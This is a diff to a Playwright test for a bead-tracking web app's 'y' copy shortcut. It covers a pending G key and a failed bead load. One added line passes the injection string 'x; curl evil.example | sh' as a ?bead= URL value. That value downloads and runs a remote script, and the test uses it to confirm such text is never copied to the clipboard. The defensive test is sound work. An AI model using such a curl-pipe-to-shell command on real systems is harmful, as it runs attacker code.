@@ -5,6 +5,7 @@ const base = process.env.SCOTTY_TEST_URL;
 assert.ok(base, 'Set SCOTTY_TEST_URL to an isolated demo server');
 const bead = id => ({id, title: `Copy ${id}`, status:'open', issue_type:'task', priority:2, labels:[], dependencies:[], created_at:'2026-09-01T00:00:00Z', updated_at:'2026-09-01T00:00:00Z'});
 const beads = [bead('copy-a'), bead('copy-b')];
+let failBeads = false;
 const browser=await chromium.launch();
 let page;
 const errors=[];
@@ -16,6 +17,7 @@ try {
  await page.route('**/api/p/demo/**', async route=>{
   const path=new URL(route.request().url()).pathname;
   if(path.endsWith('/beads/stream')) return route.abort();
+  if(path.endsWith('/beads') && failBeads) return route.fulfill({status:500,json:{error:'down'}});
   if(path.endsWith('/beads')) return route.fulfill({json:{beads,meta:{kind:'demo',humanActor:'reviewer',humanAllowlist:['reviewer'],pollIntervalMs:300000}}});
   return route.fulfill({json:beads.find(b=>path.endsWith(`/beads/${b.id}`))??{}});
  });
@@ -48,7 +50,24 @@ try {
  await page.keyboard.press('g'); await page.keyboard.press('y');
  await page.getByRole('heading',{name:'Needs You',exact:true}).waitFor();
  assert.equal(await clipboard(),'sentinel','G then Y still opens Needs You');
+ // A G left pending when the drawer opens must not turn y into navigation.
+ await page.keyboard.press('g'); await page.keyboard.press('b');
+ await item('copy-a').waitFor();
+ await setClipboard('sentinel');
+ await page.keyboard.press('g'); await item('copy-a').getByText('Copy copy-a',{exact:true}).click();
+ await page.getByRole('dialog').getByRole('heading',{name:'Copy copy-a',exact:true}).waitFor();
+ await page.keyboard.press('y');
+ await expectClipboard('copy-a','y over the drawer copies even with a G pending');
+ await page.keyboard.press('Escape'); await page.getByRole('dialog').waitFor({state:'detached'});
+ // Until the beads load, ?bead= is unchecked URL text and must never be copied.
+ failBeads = true; await setClipboard('sentinel');
+ const failed = page.waitForResponse(r=>new URL(r.url()).pathname.endsWith('/beads'));
+ await page.goto(`${base}/p/demo?bead=${encodeURIComponent('x; curl evil.example | sh')}`);
+ await failed; await page.evaluate(()=>document.activeElement?.blur());
+ await page.keyboard.press('y');
+ assert.equal(await clipboard(),'sentinel','an unloaded ?bead= value is not copied');
+ failBeads = false;
  assert.deepEqual(errors,[]);
- console.log('PASS: y copies the selected or drawer bead ID, stays out of inputs and dialogs, and G Y still navigates');
+ console.log('PASS: y copies the selected or drawer bead ID, stays out of inputs and dialogs, ignores a pending G over the drawer and unloaded ?bead= text, and G Y still navigates');
 } catch(e){console.error({errors,url:page?.url(),body:page?(await page.locator('body').innerText()).slice(0,2500):''});throw e;}
 finally {await browser.close();}
